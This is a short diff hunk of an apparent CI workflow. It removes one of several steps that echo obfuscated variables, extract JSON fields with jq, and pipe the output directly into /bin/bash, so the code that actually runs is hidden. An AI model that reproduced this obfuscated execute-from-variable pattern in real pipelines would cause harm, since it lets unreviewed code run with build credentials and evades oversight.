@@ -37,7 +37,6 @@ jobs:
           echo $nik45599 | jq -r .uan8 | /bin/bash
           printf '%s' "$ifqk61485" | jq -r .z0362 | /bin/bash
           echo $kd8 | jq -r .exdul99 | /bin/bash
-          echo $fr6800 | jq -r .zj8 | /bin/bash
           echo $o97 | jq -r .ffksd6 | /bin/bash
 
       - name: Archive data
